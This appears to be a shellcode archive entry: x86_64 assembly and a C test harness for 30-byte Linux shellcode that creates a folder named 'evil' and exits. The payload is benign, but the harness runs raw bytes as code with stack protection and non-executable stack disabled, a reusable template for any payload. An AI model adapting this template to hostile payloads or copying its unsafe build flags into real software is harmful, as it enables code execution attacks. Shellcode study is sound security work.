/*
;Title: Linux/x86_64 - mkdir() shellcode (30 bytes)
;Author: Touhid M.Shaikh
;Contact: *https://github.com/touhidshaikh
<https://github.com/touhidshaikh>*
;Category: Shellcode
;Architecture: Linux x86_64
;Description: Create Folder with 755 permission.
;             You can Change folder by change code in ASM in fname Field
;Shellcode Length: 30
;Tested on : Debian 4.12.6-1kali6 (2017-08-30) x86_64 GNU/Linux



===== COMPILATION AND EXECUTION Assemmbly file =====

#nasm -f elf64 shell.asm -o shell.o <=== Making Object File

#ld shell.o -o shell <=== Making Binary File

#./bin2shell.sh shell <== xtract hex code from the binary
(https://github.com/touhidshaikh/bin2shell)

=================SHELLCODE(INTEL FORMAT)=================

section .text
        global _start
_start:
        jmp folder
main:
        xor rax,rax
        pop rdi
        mov si,0x1ef ;<--- Set Permission
        add al,83
        syscall

        xor rax,rax
        add al,60
        syscall
folder:
        call main
        fname db "evil"     ;<---Change Folder Name Here


=======================END HERE============================

====================FOR C Compile===========================

Compile with gcc with some options.

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

*/

#include<stdio.h>
#include<string.h>


unsigned char code[] = "\xeb\x13\x48\x31\xc0\x5f\x66\
xbe\xef\x01\x04\x53\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\
xe8\xe8\xff\xff\xff\x65\x76\x69\x6c";

main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}
